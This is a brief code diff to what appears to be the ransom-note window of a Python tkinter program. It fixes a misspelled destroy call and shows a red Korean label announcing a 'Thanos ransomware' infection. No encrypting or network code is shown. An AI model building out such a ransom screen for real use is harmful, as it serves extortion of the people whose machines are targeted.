@@ -15,7 +15,7 @@ window.configure(background="black")
 def dec():
     pw=str(password.get())
 
-    window.destory()
+    window.destroy()
 
 
 label1=tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.",fg="red",bg="black", font='Helvetica 14 bold')
